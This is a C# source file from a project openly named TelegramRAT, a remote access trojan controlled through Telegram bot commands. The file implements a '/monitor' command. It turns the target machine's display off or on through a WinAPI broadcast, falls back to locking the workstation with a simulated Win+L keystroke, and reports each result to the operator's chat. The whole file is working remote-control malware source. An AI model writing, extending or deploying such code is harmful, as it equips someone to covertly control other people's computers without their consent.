using Telegram.Bot;
using TelegramRAT.Services;
using WindowsInput;
using WindowsInput.Native;

namespace TelegramRAT.Commands.System;

public class MonitorCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "monitor";
    public override int ArgsCount => 1;
    public override string Description => "Turn monitor off or on";
    public override string Example => "/monitor off";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            switch (model.Args[0].ToLower())
            {
                case "off":
                    bool broadcastSucceeded = winApiService.TryBroadcastMonitorPowerState(2, out bool broadcastTimedOut);

                    if (broadcastSucceeded)
                    {
                        await botClient.SendMessage(model.Message.Chat.Id, "Monitor turned off", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    else
                    {
                        SimulateMonitorPowerOffFallback();
                        string response = broadcastTimedOut ? "Monitor turned off (fallback after timeout)" : "Monitor turned off (fallback triggered)";
                        await botClient.SendMessage(model.Message.Chat.Id, response, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    }
                    break;

                case "on":
                    winApiService.TryBroadcastMonitorPowerState(-1, out _);
                    new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
                    await botClient.SendMessage(model.Message.Chat.Id, "Monitor turned on", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    break;

                default:
                    await botClient.SendMessage(model.Message.Chat.Id, "Type off or on. See help - /help monitor", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    break;
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }

    private void SimulateMonitorPowerOffFallback()
    {
        var keyboardSimulator = new KeyboardSimulator(new InputSimulator());
        keyboardSimulator.ModifiedKeyStroke(VirtualKeyCode.LWIN, VirtualKeyCode.VK_L);
    }
}
